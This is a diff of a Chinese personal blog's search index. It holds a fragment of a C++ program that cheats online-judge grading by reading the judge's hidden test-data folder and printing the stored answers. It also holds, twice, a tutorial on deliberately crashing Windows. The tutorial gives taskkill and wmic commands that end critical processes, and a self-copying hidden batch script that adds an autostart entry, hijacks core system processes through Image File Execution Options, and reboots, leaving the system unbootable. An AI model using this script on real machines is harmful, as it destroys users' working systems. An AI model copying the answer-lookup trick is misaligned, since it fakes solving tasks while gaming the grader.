s)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">getInputWithoutMoreEndl</span><span class="params">(string path)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checkErr</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">// 请用户填写以下题目信息</span></span><br><span class="line">	useStdIO = <span class="literal">false</span>;					<span class="comment">// 是否使用标准输入输出（true=使用 std，false=使用文件流）</span></span><br><span class="line">	string title = <span class="string">&quot;&lt;title&gt;&quot;</span>,           <span class="comment">// 当前题目名称</span></span><br><span class="line">	iFile = title + <span class="string">&quot;.in&quot;</span>,				<span class="comment">// 题目要求的输入数据文件（仅当 useStdIO 为真时有效）</span></span><br><span class="line">	oFile = title + <span class="string">&quot;.out&quot;</span>,				<span class="comment">// 题目要求的输出数据文件（仅当 useStdIO 为真时有效）</span></span><br><span class="line">	<span class="comment">// 请用户不要操作以下内容</span></span><br><span class="line"></span><br><span class="line">	problemPath = <span class="string">&quot;../../data/&quot;</span> + title + <span class="string">&quot;/&quot;</span>,</span><br><span class="line">	oExName = <span class="built_in">getExName</span>(oFile),</span><br><span class="line">	inp = <span class="string">&quot;&quot;</span>, conStr;</span><br><span class="line">	<span class="keyword">if</span>(useStdIO)&#123;</span><br><span class="line">		string addStr = <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		<span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line">		    addStr = <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">		<span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">getline</span>(cin, conStr)) inp += conStr + addStr;</span><br><span class="line">		inp = inp.<span class="built_in">substr</span>(<span class="number">0</span>, inp.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		inp = <span class="built_in">getInputWithoutMoreEndl</span>(iFile);</span><br><span class="line">		<span class="built_in">freopen</span>(oFile.<span class="built_in">c_str</span>(), <span class="string">&quot;wb&quot;</span>, stdout);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> dataFileCNT = <span class="built_in">getData</span>(problemPath);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=dataFileCNT; i++)&#123;</span><br><span class="line">		string exName = <span class="built_in">getExName</span>(dataFile[i]);</span><br><span class="line">        <span class="keyword">if</span>(exName != <span class="string">&quot;.in&quot;</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">			string absPath = problemPath + dataFile[i],</span><br><span class="line">			curIn = <span class="built_in">getInputWithoutMoreEndl</span>(absPath);</span><br><span class="line">			<span class="keyword">if</span>(curIn == inp)&#123;</span><br><span class="line">				<span class="type">int</span> pointPOS = dataFile[i].<span class="built_in">find</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">				string ansPath = problemPath + dataFile[i].<span class="built_in">substr</span>(<span class="number">0</span>, pointPOS) + oExName,</span><br><span class="line">				ans = <span class="built_in">getInput</span>(ansPath);</span><br><span class="line">				cout &lt;&lt; ans;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Could not find the answer&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getData</span><span class="params">(string path)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> dataFileCNT = <span class="number">0</span>;</span><br><span class="line">	DIR *dirPath = <span class="built_in">opendir</span>(path.<span class="built_in">c_str</span>());</span><br><span class="line">    <span class="keyword">if</span>(!dirPath)&#123;</span><br><span class="line">    	errors = <span class="literal">true</span>;</span><br><span class="line">    	errType = <span class="string">&quot;Could not reach the folder&quot;</span>;</span><br><span class="line">        <span class="built_in">checkErr</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    dirent *dName;</span><br><span class="line">    <span class="keyword">while</span>((dName = <span class="built_in">readdir</span>(dirPath)))&#123;</span><br><span class="line">        dataFile[++dataFileCNT] = dName -&gt; d_name;</span><br><span class="line">        <span class="keyword">if</span>(dataFile[dataFileCNT] == <span class="string">&quot;.&quot;</span> || dataFile[dataFileCNT] == <span class="string">&quot;..&quot;</span>) dataFileCNT--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">closedir</span>(dirPath);</span><br><span class="line">    <span class="keyword">return</span> dataFileCNT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getInput</span><span class="params">(string path)</span></span>&#123;</span><br><span class="line">	FILE *fp = <span class="built_in">fopen</span>(path.<span class="built_in">c_str</span>(), <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp)&#123;</span><br><span class="line">		errors = <span class="literal">true</span>;</span><br><span class="line">		errType = <span class="string">&quot;Could not read from the INPUT file&quot;</span>;</span><br><span class="line">		<span class="built_in">checkErr</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> buffer[BUFINF] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">feof</span>(fp))&#123;</span><br><span class="line">		<span class="built_in">fread</span>(buffer, <span class="built_in">sizeof</span>(buffer), <span class="number">1</span>, fp);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">feof</span>(fp)) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">string</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getInputWithoutMoreEndl</span><span class="params">(string path)</span></span>&#123;</span><br><span class="line">	string tmp = <span class="built_in">getInput</span>(path);</span><br><span class="line">	<span class="type">int</span> bufferLen = tmp.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(tmp[bufferLen] == <span class="string">&#x27;\n&#x27;</span>) tmp = tmp.<span class="built_in">substr</span>(<span class="number">0</span>, bufferLen--);</span><br><span class="line">	<span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getExName</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> tmp = s.<span class="built_in">find</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> s.<span class="built_in">substr</span>(tmp == <span class="number">-1</span> ? <span class="number">0</span> : tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checkErr</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(errors)&#123;</span><br><span class="line">		cerr &lt;&lt; errType;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>OI 系列</tag>
       </tags>
   </entry>
   <entry>
@@ -1406,56 +1406,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BSOD 的技巧（如何使 Windows 蓝屏）</title>
-    <url>/2023/07/02/%E5%BF%AB%E9%80%9F%E8%AE%A9%E7%94%B5%E8%84%91%E8%93%9D%E5%B1%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>电脑蓝屏，又叫蓝屏死机（<code>Blue Screen of Death</code>，简称 <code>BSOD</code>），是微软的 <code>Windows</code> 系列操作系统在无法从一个系统错误中恢复过来时，为保护电脑数据文件不被破坏而强制显示的屏幕图像。<br />
-<code>Windows</code> 操作系统的蓝屏死机提示已经成为标志性的画面。大部分是系统崩溃的现象。<code>Windows</code> 中有两个蓝底白字图像都被称为蓝屏死机：一种是 <code>Windows 9x</code> 操作系统发生小故障，一种是 <code>Windows NT</code> 发生内核错误。由于 <code>Windows 9x</code> 已退出历史舞台，所以现在一般指后者。<br />
-——百度百科</p>
-</blockquote>
-<h1 id="蓝屏的方法"><a class="markdownIt-Anchor" href="#蓝屏的方法"></a> 蓝屏的方法</h1>
-<p>如果你想要制作一个可以导致蓝屏的程序，不妨试试以下几种办法。这些办法有的不会对系统造成伤害，有的则可能导致系统无法开机。建议您在备份好数据的情况下再继续作死。</p>
-<blockquote>
-<p><strong>文章中所提的内容仅供学术交流和参考，请勿用于非法用途或欺骗他人。不当使用导致的不良后果与原作者无关。</strong><br />
-另外，本文中的命令行都是通过 <a href="https://bat-to-exe-converter-x64.en.softonic.com/"><code>Bat_To_Exe_Converter</code></a> 转化为 <code>.exe</code> 可执行程序的，所以自启动等项目可能会失效。</p>
-</blockquote>
-<h2 id="结束系统关键进程critical-process-died"><a class="markdownIt-Anchor" href="#结束系统关键进程critical-process-died"></a> 结束系统关键进程（<code>CRITICAL PROCESS DIED</code>）</h2>
-<p>对系统无害，在 <code>Windows XP</code> 以上才有用（<code>XP</code> 会关机）。<br />
-可以直接结束关键的 <code>Windows NT</code> 进程，例如 <code>wininit.exe</code>、<code>smss.exe</code>、<code>csrss.exe</code> 等；也可以直接结束全部进程。<br />
-以下命令，任选其一都可以导致蓝屏。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">taskkill /im wininit.exe /f</span><br><span class="line">taskkill /im svchost.exe /f</span><br><span class="line">taskkill /fi <span class="string">&quot;pid ne 1&quot;</span> /f</span><br><span class="line">cmd /c <span class="keyword">for</span> /f %I <span class="keyword">in</span> (<span class="string">&#x27;wmic process get Name&#x27;</span>)<span class="keyword">do</span> (wmic <span class="keyword">process</span> <span class="built_in">where</span> Name=<span class="string">&quot;%I&quot;</span> delete)</span><br></pre></td></tr></table></figure>
-<p>对于 <code>Windows 10</code> 及以上，也可以使用 <code>PowerShell</code> 直接访问 <code>wininit.exe</code>，造成电脑蓝屏！<br />
-具体地，打开 <code>PowerShell</code> 后直接输入 <code>wininit</code> 即可。</p>
-<h2 id="使用-notmyfault驱动文件-notmyfaultsys"><a class="markdownIt-Anchor" href="#使用-notmyfault驱动文件-notmyfaultsys"></a> 使用 <code>notmyfault</code>（驱动文件 <code>notmyfault.sys</code>）</h2>
-<p>对 <code>Windows XP</code> 以上才有用，<code>Windows XP x64</code> 有可能可以。<br />
-需要用到第三方软件，来源于 <a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite"><code>Microsoft Sysinternals Suite</code></a> 中的 <code>notmyfault</code> 系列。<br />
-<img src="/post-images/1688275281498.png" alt="" /></p>
-<p>我们只用到 <code>notmyfaultc</code> 和 <code>notmyfaultc64</code>，这是命令行版本的；其他那两个是 <code>GUI</code> 版。<br />
-具体的命令：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">if</span> %PROCESSOR_ARCHITECTURE%==AMD64 (</span><br><span class="line">notmyfaultc64.exe /accepteula</span><br><span class="line">notmyfaultc64.exe /crash <span class="number">0</span>x03</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">notmyfaultc.exe /accepteula</span><br><span class="line">notmyfaultc.exe /crash <span class="number">0</span>x03</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<p>首先要确定系统的位数，再调用蓝屏。<br />
-第 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span> 行和第 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span> 行可以改变，是根据想要的蓝屏类型确定的；也可以挂起进程。<br />
-使用说明如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NotMyFault is a tool used in the Windows Internals books to show how common device driver bugs affect a system.</span><br><span class="line">This is the console version of NotMyFault.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    notmyfaultc.exe [/wait] /crash crash_type_num</span><br><span class="line"></span><br><span class="line">    crash type:</span><br><span class="line">      0x01: High IRQL fault (Kernel-mode)</span><br><span class="line">      0x02: Buffer overflow</span><br><span class="line">      0x03: Code overwrite</span><br><span class="line">      0x04: Stack trash</span><br><span class="line">      0x05: High IRQL fault (User-mode)</span><br><span class="line">      0x06: Stack overflow</span><br><span class="line">      0x07: Hardcoded breakpoint</span><br><span class="line">      0x08: Double Free</span><br><span class="line">    wait:</span><br><span class="line">      wait until named event NOTMYFAULT is set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /hang hang_type_num</span><br><span class="line"></span><br><span class="line">    hang type:</span><br><span class="line">      0x01: Hang with IRP</span><br><span class="line">      0x02: Hang with DPC</span><br><span class="line">      0x03: Deadlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /leak leak_type_num [/rate KB/s] [/duration seconds]</span><br><span class="line"></span><br><span class="line">    leak type:</span><br><span class="line">      0x01: Paged Leak</span><br><span class="line">      0x02: Nonpaged Leak</span><br><span class="line">    rate:</span><br><span class="line">      default value is 1000 KB/s</span><br><span class="line">      append &#x27;m&#x27; for megabytes, &#x27;g&#x27; for gigabytes or &#x27;t&#x27; for terabytes    duration:</span><br><span class="line">      default value is 30s</span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe bugcheck id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /getdumptype</span><br><span class="line">    notmyfaultc.exe setdumptype [full|kernel]</span><br></pre></td></tr></table></figure>
-<h2 id="删除或劫持内核关键程序0xc000021a"><a class="markdownIt-Anchor" href="#删除或劫持内核关键程序0xc000021a"></a> 删除或劫持内核关键程序（<code>0xc000021a</code>）</h2>
-<p>前面两种方法，重启后即可恢复（除非设置了自启动），那么下面就介绍两种较难修复的。</p>
-<p>删除关键程序，需要到 <code>PE</code> 中去提取或恢复。因为是系统文件，所以一般的用户无法修改，提权过程也相对复杂，推荐使用 <a href="https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip"><code>NSudo</code></a> 工具，命令行版可以轻松删除系统文件。</p>
-<p>关于劫持，可以在注册表中进行调整，通过命令行的方式写入注册表（附赠一只自启动）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">copy %0 v.exe</span><br><span class="line">attrib +s +h /s /d v.exe</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Run&quot; /f /v &quot;vvvvv&quot; /t REG_SZ /d &quot;%cd%\v.exe&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\spoolsv.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">shutdown /r /t 0</span><br></pre></td></tr></table></figure>
-<p>不同于一般的自启动，由于内核关键进程在进入桌面之前就已经启动，所以在锁屏页面前就会蓝屏；安全模式同样。在 <code>Windows XP</code> 中表现为黑屏，只有鼠标可以移动。<br />
-修复方法，就是进入 <code>PE</code> 系统删除映像劫持项目和自启动项目，删除释放的文件等。</p>
-<h2 id="假蓝屏"><a class="markdownIt-Anchor" href="#假蓝屏"></a> 假蓝屏</h2>
-<p>网上各种各样的批处理假蓝屏烂大街了，有一个真实一点的工具叫 <a href="https://github.com/FlyTechVideos/BluescreenSimulator/releases"><code>BluescreenSimulator</code></a>，可以通过命令行调用。<br />
-因为有点儿跑题，这里不再赘述。</p>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>化繁为简 or 化简为繁</title>
     <url>/2024/07/18/%E5%8C%96%E7%B9%81%E4%B8%BA%E7%AE%80-or-%E5%8C%96%E7%AE%80%E4%B8%BA%E7%B9%81/</url>
     <content><![CDATA[<p>为什么我要写这篇文章？</p>
@@ -1501,6 +1451,56 @@
 <p>再利用分号，就可以把它们全部压缩至一行。如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(x1, y1), (x2, y2) = (f := <span class="keyword">lambda</span> l: [<span class="built_in">eval</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">input</span>(<span class="string">f&quot;<span class="subst">&#123;l&#125;</span> &gt;&gt;&gt; &quot;</span>).split()])(<span class="string">&quot;A&quot;</span>), f(<span class="string">&quot;B&quot;</span>); x, z, y = <span class="string">&quot;-&quot;</span> <span class="keyword">if</span> (k := (f := <span class="keyword">lambda</span> x: <span class="built_in">int</span>(x) <span class="keyword">if</span> <span class="built_in">int</span>(x) == <span class="built_in">float</span>(x) <span class="keyword">else</span> x)(k := (y2 - y1) / (x2 - x1))) == -<span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="keyword">if</span> k == <span class="number">1</span> <span class="keyword">else</span> k, <span class="string">&quot;&quot;</span> <span class="keyword">if</span> <span class="keyword">not</span> (b := f(b := y1 - k * x1)) <span class="keyword">else</span> b, [<span class="string">&quot;&quot;</span>, <span class="string">&quot;+&quot;</span>][b &gt; <span class="number">0</span>]; <span class="built_in">print</span>(<span class="string">f&quot;y=<span class="subst">&#123;x&#125;</span>x<span class="subst">&#123;y&#125;</span><span class="subst">&#123;z&#125;</span>&quot;</span>) <span class="keyword">if</span> k <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">f&quot;y=<span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
 <p>Perfect!</p>
+]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BSOD 的技巧（如何使 Windows 蓝屏）</title>
+    <url>/2023/07/02/%E5%BF%AB%E9%80%9F%E8%AE%A9%E7%94%B5%E8%84%91%E8%93%9D%E5%B1%8F/</url>
+    <content><![CDATA[<blockquote>
+<p>电脑蓝屏，又叫蓝屏死机（<code>Blue Screen of Death</code>，简称 <code>BSOD</code>），是微软的 <code>Windows</code> 系列操作系统在无法从一个系统错误中恢复过来时，为保护电脑数据文件不被破坏而强制显示的屏幕图像。<br />
+<code>Windows</code> 操作系统的蓝屏死机提示已经成为标志性的画面。大部分是系统崩溃的现象。<code>Windows</code> 中有两个蓝底白字图像都被称为蓝屏死机：一种是 <code>Windows 9x</code> 操作系统发生小故障，一种是 <code>Windows NT</code> 发生内核错误。由于 <code>Windows 9x</code> 已退出历史舞台，所以现在一般指后者。<br />
+——百度百科</p>
+</blockquote>
+<h1 id="蓝屏的方法"><a class="markdownIt-Anchor" href="#蓝屏的方法"></a> 蓝屏的方法</h1>
+<p>如果你想要制作一个可以导致蓝屏的程序，不妨试试以下几种办法。这些办法有的不会对系统造成伤害，有的则可能导致系统无法开机。建议您在备份好数据的情况下再继续作死。</p>
+<blockquote>
+<p><strong>文章中所提的内容仅供学术交流和参考，请勿用于非法用途或欺骗他人。不当使用导致的不良后果与原作者无关。</strong><br />
+另外，本文中的命令行都是通过 <a href="https://bat-to-exe-converter-x64.en.softonic.com/"><code>Bat_To_Exe_Converter</code></a> 转化为 <code>.exe</code> 可执行程序的，所以自启动等项目可能会失效。</p>
+</blockquote>
+<h2 id="结束系统关键进程critical-process-died"><a class="markdownIt-Anchor" href="#结束系统关键进程critical-process-died"></a> 结束系统关键进程（<code>CRITICAL PROCESS DIED</code>）</h2>
+<p>对系统无害，在 <code>Windows XP</code> 以上才有用（<code>XP</code> 会关机）。<br />
+可以直接结束关键的 <code>Windows NT</code> 进程，例如 <code>wininit.exe</code>、<code>smss.exe</code>、<code>csrss.exe</code> 等；也可以直接结束全部进程。<br />
+以下命令，任选其一都可以导致蓝屏。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">taskkill /im wininit.exe /f</span><br><span class="line">taskkill /im svchost.exe /f</span><br><span class="line">taskkill /fi <span class="string">&quot;pid ne 1&quot;</span> /f</span><br><span class="line">cmd /c <span class="keyword">for</span> /f %I <span class="keyword">in</span> (<span class="string">&#x27;wmic process get Name&#x27;</span>)<span class="keyword">do</span> (wmic <span class="keyword">process</span> <span class="built_in">where</span> Name=<span class="string">&quot;%I&quot;</span> delete)</span><br></pre></td></tr></table></figure>
+<p>对于 <code>Windows 10</code> 及以上，也可以使用 <code>PowerShell</code> 直接访问 <code>wininit.exe</code>，造成电脑蓝屏！<br />
+具体地，打开 <code>PowerShell</code> 后直接输入 <code>wininit</code> 即可。</p>
+<h2 id="使用-notmyfault驱动文件-notmyfaultsys"><a class="markdownIt-Anchor" href="#使用-notmyfault驱动文件-notmyfaultsys"></a> 使用 <code>notmyfault</code>（驱动文件 <code>notmyfault.sys</code>）</h2>
+<p>对 <code>Windows XP</code> 以上才有用，<code>Windows XP x64</code> 有可能可以。<br />
+需要用到第三方软件，来源于 <a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite"><code>Microsoft Sysinternals Suite</code></a> 中的 <code>notmyfault</code> 系列。<br />
+<img src="/post-images/1688275281498.png" alt="" /></p>
+<p>我们只用到 <code>notmyfaultc</code> 和 <code>notmyfaultc64</code>，这是命令行版本的；其他那两个是 <code>GUI</code> 版。<br />
+具体的命令：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">if</span> %PROCESSOR_ARCHITECTURE%==AMD64 (</span><br><span class="line">notmyfaultc64.exe /accepteula</span><br><span class="line">notmyfaultc64.exe /crash <span class="number">0</span>x03</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">notmyfaultc.exe /accepteula</span><br><span class="line">notmyfaultc.exe /crash <span class="number">0</span>x03</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>首先要确定系统的位数，再调用蓝屏。<br />
+第 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span> 行和第 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span></span></span></span> 行可以改变，是根据想要的蓝屏类型确定的；也可以挂起进程。<br />
+使用说明如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NotMyFault is a tool used in the Windows Internals books to show how common device driver bugs affect a system.</span><br><span class="line">This is the console version of NotMyFault.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    notmyfaultc.exe [/wait] /crash crash_type_num</span><br><span class="line"></span><br><span class="line">    crash type:</span><br><span class="line">      0x01: High IRQL fault (Kernel-mode)</span><br><span class="line">      0x02: Buffer overflow</span><br><span class="line">      0x03: Code overwrite</span><br><span class="line">      0x04: Stack trash</span><br><span class="line">      0x05: High IRQL fault (User-mode)</span><br><span class="line">      0x06: Stack overflow</span><br><span class="line">      0x07: Hardcoded breakpoint</span><br><span class="line">      0x08: Double Free</span><br><span class="line">    wait:</span><br><span class="line">      wait until named event NOTMYFAULT is set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /hang hang_type_num</span><br><span class="line"></span><br><span class="line">    hang type:</span><br><span class="line">      0x01: Hang with IRP</span><br><span class="line">      0x02: Hang with DPC</span><br><span class="line">      0x03: Deadlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /leak leak_type_num [/rate KB/s] [/duration seconds]</span><br><span class="line"></span><br><span class="line">    leak type:</span><br><span class="line">      0x01: Paged Leak</span><br><span class="line">      0x02: Nonpaged Leak</span><br><span class="line">    rate:</span><br><span class="line">      default value is 1000 KB/s</span><br><span class="line">      append &#x27;m&#x27; for megabytes, &#x27;g&#x27; for gigabytes or &#x27;t&#x27; for terabytes    duration:</span><br><span class="line">      default value is 30s</span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe bugcheck id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or  notmyfaultc.exe /getdumptype</span><br><span class="line">    notmyfaultc.exe setdumptype [full|kernel]</span><br></pre></td></tr></table></figure>
+<h2 id="删除或劫持内核关键程序0xc000021a"><a class="markdownIt-Anchor" href="#删除或劫持内核关键程序0xc000021a"></a> 删除或劫持内核关键程序（<code>0xc000021a</code>）</h2>
+<p>前面两种方法，重启后即可恢复（除非设置了自启动），那么下面就介绍两种较难修复的。</p>
+<p>删除关键程序，需要到 <code>PE</code> 中去提取或恢复。因为是系统文件，所以一般的用户无法修改，提权过程也相对复杂，推荐使用 <a href="https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip"><code>NSudo</code></a> 工具，命令行版可以轻松删除系统文件。</p>
+<p>关于劫持，可以在注册表中进行调整，通过命令行的方式写入注册表（附赠一只自启动）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">copy %0 v.exe</span><br><span class="line">attrib +s +h /s /d v.exe</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Run&quot; /f /v &quot;vvvvv&quot; /t REG_SZ /d &quot;%cd%\v.exe&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\spoolsv.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\&quot;</span><br><span class="line">shutdown /r /t 0</span><br></pre></td></tr></table></figure>
+<p>不同于一般的自启动，由于内核关键进程在进入桌面之前就已经启动，所以在锁屏页面前就会蓝屏；安全模式同样。在 <code>Windows XP</code> 中表现为黑屏，只有鼠标可以移动。<br />
+修复方法，就是进入 <code>PE</code> 系统删除映像劫持项目和自启动项目，删除释放的文件等。</p>
+<h2 id="假蓝屏"><a class="markdownIt-Anchor" href="#假蓝屏"></a> 假蓝屏</h2>
+<p>网上各种各样的批处理假蓝屏烂大街了，有一个真实一点的工具叫 <a href="https://github.com/FlyTechVideos/BluescreenSimulator/releases"><code>BluescreenSimulator</code></a>，可以通过命令行调用。<br />
+因为有点儿跑题，这里不再赘述。</p>
 ]]></content>
       <categories>
         <category>计算机</category>
